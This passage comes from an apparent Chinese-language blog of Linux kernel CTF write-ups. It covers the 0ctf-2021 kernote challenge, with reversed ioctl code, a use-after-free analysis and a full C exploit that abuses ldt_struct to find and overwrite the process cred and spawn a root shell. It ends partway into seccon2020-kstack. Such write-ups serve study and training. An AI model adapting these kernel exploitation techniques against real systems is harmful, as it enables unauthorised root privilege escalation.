<span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&quot;cat b64_exp | base64 -d &gt; ./exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x ./exploit&quot;</span>)</span><br><span class="line">    randomization = (try_count % <span class="number">1024</span>) * <span class="number">0x100000</span></span><br><span class="line">    log.info(<span class="string">&#x27;trying randomization: &#x27;</span> + <span class="built_in">hex</span>(randomization))</span><br><span class="line">    p.sendline(<span class="string">&quot;./exploit &quot;</span> + <span class="built_in">str</span>(randomization))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.recvuntil(<span class="string">b&quot;Rebooting in 1 seconds..&quot;</span>, timeout=<span class="number">60</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    log.warn(<span class="string">&#x27;failed!&#x27;</span>)</span><br><span class="line">    try_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;success to get the root shell!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tctf2021-kernote"><a href="#tctf2021-kernote" class="headerlink" title="tctf2021-kernote"></a>tctf2021-kernote</h2><p>附件以及官方题解<a href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">My-CTF-Challenges/0ctf-2021-final/kernote at master · YZloser/My-CTF-Challenges (github.com)</a></p><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>与一般的 kernel pwn 题不同的是，这一次给出的文件系统不是简陋的 ramfs 而是常规的 ext4 镜像文件，我们可以使用 <code>mount</code> 命令将其挂载以查看并修改其内容</p><p><code>sudo mount rootfs.img /mnt/temp</code></p><p>本地调试时直接将文件复制到挂载点下即可，不需要额外的重新打包的步骤</p><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p>在文件中给出了一些内核配置</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Here are some kernel config options <span class="keyword">in</span> <span class="keyword">case</span> you need it</span><br><span class="line">```</span><br><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=<span class="string">&quot;&quot;</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>出题人在编译内核时并没有选择默认的 slub 分配器，而是选择了 <code>slab</code> 分配器，后续解题的过程也也需要用到slab 的特征</p><ul><li>开启了 Random Freelist（slab 的 freelist 会进行一定的随机化）</li><li>开启了 Hardened Freelist（slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或（参照 glibc 的 safe-linking））</li><li>开启了 Hardened Usercopy（用户态在向内核拷贝数据时会进行检查，检查<strong>地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等</strong>）</li><li>后两个保护都是针对modprobe_path的 为只读，不可修改</li></ul><p>此外从启动脚本中能分析出还开启了smap,smep,kpti,kaslr</p><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>文件系统存在一个模块<code>kernote.ko</code></p><p>ida分析,可以看到其只定义了ioctl函数</p><p><strong>0x6666</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6666</span> )                 <span class="comment">// choose</span></span><br><span class="line">&#123;</span><br><span class="line">  v12 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  note = buf[v3];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择note,note是一个全局变量</p><p><strong>0x6667</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6667</span> )            <span class="comment">// alloc</span></span><br><span class="line">&#123;</span><br><span class="line">  v12 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a2 = <span class="number">3264LL</span>;</span><br><span class="line">    v10 = (<span class="type">unsigned</span> __int64 *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">5</span>], <span class="number">3264LL</span>, <span class="number">8LL</span>, v5, <span class="number">-1LL</span>);</span><br><span class="line">    buf[v3] = v10;</span><br><span class="line">    v12 = -(__int64)(v10 == <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>申请object,申请的size是8,但是因为slab的原因申请的实际上是32的obj</p><p><strong>0x6668</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6668</span> )                   <span class="comment">// free</span></span><br><span class="line">&#123;</span><br><span class="line">  v12 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = buf[v3];</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      kfree(v11, a2, v4, v5, <span class="number">-1LL</span>);</span><br><span class="line">      v12 = <span class="number">0LL</span>;</span><br><span class="line">      buf[v3] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放buf但是可以看到其并没有清空note</p><p>从而导致了一个悬挂的指针,可以uaf</p><p><strong>0x6669</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6669</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v12 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( note )</span><br><span class="line">  &#123;</span><br><span class="line">    *note = v3;</span><br><span class="line">    v12 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向note中写</p><p><strong>0x666a</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0x666A</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">  v6 = *(_QWORD *)(*(_QWORD *)(__readgsqword((<span class="type">unsigned</span> <span class="type">int</span>)&amp;current_task) + <span class="number">2776</span>) + <span class="number">128LL</span>);</span><br><span class="line">  v7 = _InterlockedExchangeAdd((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)v6, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> || v7 + <span class="number">1</span> &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a2 = <span class="number">1LL</span>;</span><br><span class="line">      refcount_warn_saturate(v6, <span class="number">1LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    a2 = <span class="number">2LL</span>;</span><br><span class="line">    refcount_warn_saturate(v6, <span class="number">2LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(v6 + <span class="number">72</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_32B);</span><br><span class="line">    v12 = <span class="number">-1LL</span>;</span><br><span class="line">LABEL_15:</span><br><span class="line">    pv_ops[<span class="number">86</span>](&amp;spin, a2, v4, v5, v12);</span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">  &#125;</span><br><span class="line">  kernote_ioctl_cold();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说实话看不太懂这是在干什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kernote_ioctl_cold</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( note )</span><br><span class="line">    printk(&amp;unk_35A);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    printk(&amp;unk_343);</span><br><span class="line">  JUMPOUT(<span class="number">0xAB</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又看到这个函数会打印obj的地址</p><p>内核的很多宏展开及多层结构体套娃让逆向难度加大了一筹</p><p>最后在出题人的源码中可以看到</p><p>这其实是get_current_user()函数,如果用户是root才能执行打印obj地址,所以实际上这个分支并没有软用</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>那么现在只有一个 UAF，而且只能写obj的首8字节，没法直接泄露内核相关数据，分配的 object 大小限制为 32，这无疑为解题增添了一定难度</p><p>官方题解选择使用 <code>ldt_struct</code> 这个内核结构体进行进一步利用,具体关于该结构体的利用方法可见拾遗部分</p><p>因为ldt_struct结构体的大小为0x10,在slab分配器中同样是使用kmalloc-32</p><p>因此通过垂悬指针我们能够控制其结构体的entries</p><p>那么我们的思路便是</p><ol><li>利用read_ldt爆破page_offset_base</li><li>利用read_ldt搜索进程cred</li><li>利用write_ldt修改进程euid</li></ol><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span>         <span class="comment">/* Definition of struct user_desc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span>     <span class="comment">/* Definition of SYS_* constants */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_SELECTNOTE 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_ADDNOTE 0x6667</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_DELNOTE 0x6668</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_EDITNOTE 0x6669</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERN_SHOWNOTE 0x666a</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> target[<span class="number">1</span>];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> zero;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">u_desc</span>;</span></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">int</span> flag;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *buf=(<span class="type">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;0ops0ops0ops&quot;</span>);</span><br><span class="line">    <span class="type">int</span> pid=getpid();</span><br><span class="line">    fd=open(<span class="string">&quot;/dev/kernote&quot;</span>,O_RDONLY);</span><br><span class="line">    u_desc.base_addr=<span class="number">0xff0000</span>;</span><br><span class="line">    u_desc.entry_number=<span class="number">0x8000</span>/<span class="number">8</span>;</span><br><span class="line">    u_desc.limit=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">    u_desc.contents=<span class="number">0</span>;</span><br><span class="line">    u_desc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">    u_desc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">    u_desc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">    u_desc.useable=<span class="number">0</span>;</span><br><span class="line">    u_desc.lm=<span class="number">0</span>;</span><br><span class="line">    ioctl(fd,KERN_ADDNOTE,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,KERN_SELECTNOTE,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,KERN_DELNOTE,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> ret=syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;u_desc,<span class="keyword">sizeof</span>(u_desc));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr=<span class="number">0xffff888000000000</span>uLL;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        ioctl(fd,KERN_EDITNOTE,addr);</span><br><span class="line">        ret=syscall(SYS_modify_ldt, <span class="number">0</span>, target,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            addr+=<span class="number">0x40000000</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: %llx\n&quot;</span>,addr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> PAGE_OFFSET=addr;</span><br><span class="line">    <span class="type">int</span> pipefd[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> cred_addr=<span class="number">0</span>;</span><br><span class="line">    pipe(pipefd);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        addr+=<span class="number">0x8000</span>;</span><br><span class="line">        <span class="comment">//ioctl(fd,0,addr);</span></span><br><span class="line">        ioctl(fd,KERN_EDITNOTE,addr);</span><br><span class="line">        ret=fork();</span><br><span class="line">        <span class="keyword">if</span>(!ret)&#123;</span><br><span class="line">            ret=syscall(SYS_modify_ldt, <span class="number">0</span>, buf,<span class="number">0x8000</span>);</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> *search = (<span class="type">unsigned</span> <span class="type">long</span> *)buf;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ( (<span class="type">unsigned</span> <span class="type">long</span>)search &lt; (<span class="type">unsigned</span> <span class="type">long</span>)buf+<span class="number">0x8000</span>)&#123;</span><br><span class="line">                search = memmem(search, (<span class="type">unsigned</span> <span class="type">long</span>)buf +<span class="number">0x8000</span>- (<span class="type">unsigned</span> <span class="type">long</span>)search, <span class="string">&quot;0ops0ops0ops&quot;</span>, <span class="number">12</span>);</span><br><span class="line">                <span class="keyword">if</span> ( search == <span class="literal">NULL</span> )<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> ( (search[<span class="number">-2</span>] &gt; PAGE_OFFSET) &amp;&amp; (search[<span class="number">-3</span>] &gt; PAGE_OFFSET )&amp;&amp;(<span class="type">int</span>)search[<span class="number">-58</span>]==pid)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Found cred : %llx\n&quot;</span>,search[<span class="number">-2</span>]);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Found pid: %d\n&quot;</span>,search[<span class="number">-58</span>]);</span><br><span class="line">                    ans=search[<span class="number">-2</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                search+=<span class="number">12</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipefd[<span class="number">1</span>],&amp;ans,<span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipefd[<span class="number">0</span>],&amp;cred_addr,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span>(cred_addr)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(fd,KERN_EDITNOTE,cred_addr+<span class="number">4</span>);</span><br><span class="line">    ret=fork();</span><br><span class="line">    <span class="keyword">if</span>(!ret)&#123;</span><br><span class="line">        ret=fork();</span><br><span class="line">        <span class="keyword">if</span>(!ret)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">0</span>,&amp;cpu_set);</span><br><span class="line">            ret=sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">15</span>;i++)&#123;</span><br><span class="line">                ioctl(fd,KERN_ADDNOTE,i);</span><br><span class="line">            &#125;</span><br><span class="line">            ioctl(fd,KERN_SELECTNOTE,<span class="number">11</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">15</span>;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                ioctl(fd,KERN_DELNOTE,i);</span><br><span class="line">            &#125;</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">1</span>,&amp;cpu_set);</span><br><span class="line">            sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ioctl(fd,KERN_EDITNOTE,cred_addr+<span class="number">4</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">0</span>,&amp;cpu_set);</span><br><span class="line">        ret=sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(cpu_set),&amp;cpu_set);</span><br><span class="line">        u_desc.base_addr=<span class="number">0</span>;</span><br><span class="line">        u_desc.entry_number=<span class="number">2</span>;</span><br><span class="line">        u_desc.limit=<span class="number">0</span>;</span><br><span class="line">        u_desc.seg_32bit=<span class="number">0</span>;</span><br><span class="line">        u_desc.contents=<span class="number">0</span>;</span><br><span class="line">        u_desc.read_exec_only=<span class="number">0</span>;</span><br><span class="line">        u_desc.limit_in_pages=<span class="number">0</span>;</span><br><span class="line">        u_desc.seg_not_present=<span class="number">0</span>;</span><br><span class="line">        u_desc.useable=<span class="number">0</span>;</span><br><span class="line">        u_desc.lm=<span class="number">0</span>;</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        ret=syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;u_desc,<span class="keyword">sizeof</span>(u_desc));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ret);</span><br><span class="line">        sleep(<span class="number">100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,geteuid());</span><br><span class="line">    setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不太清楚为什么任意写时需先分配 index 为 1~ 15 的 object，并全部释放，选取其中的 <code>index 11</code> 来进行任意写，其他的 index 都会失败，仅分配一个 object 也会失败</p><p>猜测应该是因为还有许多结构体都会从kmalloc-32中取,因此需要较多的object以供选择</p><p>另外最后使用了<code>setreuid(0,0);</code>以及<code>setregid(0,0);</code>全面提权</p><p>以setreuid为例,设置的ruid至少要等于旧cred的uid,euid其中一个</p><p>设置的euid至少要等于旧cred的uid,euid,suid其中一个</p><p>此外还需要绑定cpu以增大成功概率,因为启动脚本中制定了可以有两个核</p><h2 id="seccon2020-kstack"><a href="#seccon2020-kstack" class="headerlink" title="seccon2020-kstack"></a>seccon2020-kstack</h2><h3 id="保护-1"><a href="#保护-1" class="headerlink" title="保护"></a>保护</h3><p>启动脚本可以观察出开启了smep,kaslr</p><p>执行<code>cat /sys/devices/system/cpu/vulnerabilities/*</code></p><p>可以观察到开启了kpti</p><h3 id="模块-1"><a href="#模块-1" class="headerlink" title="模块"></a>模块</h3><p>模块只注册了ioctl菜单,其中有两个选项</p><p><strong>0x57AC0001</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a2 == <span class="number">0x57AC0001</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = kmem_cache_alloc(kmalloc_caches[<span class="number">5</span>], <span class="number">6291648LL</span>);</span><br><span class="line">  *(_DWORD *)v8 = v4;</span><br><span class="line">  v9 = head;</span><br><span class="line">  head = v8;</span><br><span class="line">  *(_QWORD *)(v8 + <span class="number">16</span>) = v9;</span><br><span class="line">  <span class="keyword">if</span> ( !copy_from_user(v8 + <span class="number">8</span>, a3, <span class="number">8LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  head = *(_QWORD *)(v8 + <span class="number">16</span>);</span><br><span class="line">  kfree(v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用head维护了一个单向链表</p><p>一个节点的格式大概如下,v4暂时不知道是什么玩意</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span 